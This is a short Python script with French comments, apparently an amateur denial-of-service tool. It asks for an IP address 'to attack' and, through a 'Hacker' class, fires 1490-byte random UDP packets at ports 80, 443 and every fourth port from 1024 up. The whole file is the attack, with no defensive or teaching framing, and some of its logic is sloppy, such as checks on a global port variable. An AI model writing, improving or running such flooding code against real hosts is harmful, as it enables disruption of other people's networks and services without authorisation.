import socket
import random

# Initialisation
site = input("Ip a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Initialisation des variables
port = 1
sent = 0

# Création d'une classe hacker
class Hacker:

    def __init__(self, site, port):
        self.port = port
        self.site = site

    def hack_hard(self):
        if port == 80:
            print(port)
            return sock.sendto(bytes, (self.site, self.port))
        if port == 443:
            print(port)
            return sock.sendto(bytes, (self.site, self.port))
        if port >= 1024:
            if port % 4 == 0:
                print(port)
                return sock.sendto(bytes, (self.site, self.port))
        
    def hackons(self):
        sock.sendto(bytes, (self.site, self.port))
    
    def hackons_if(self):
        if port % 4 == 0:
            return sock.sendto(bytes, (self.site, self.port))

        



while port <= 65534:
    hacker = Hacker(site, port)
    hacker.hack_hard()
    port += 1


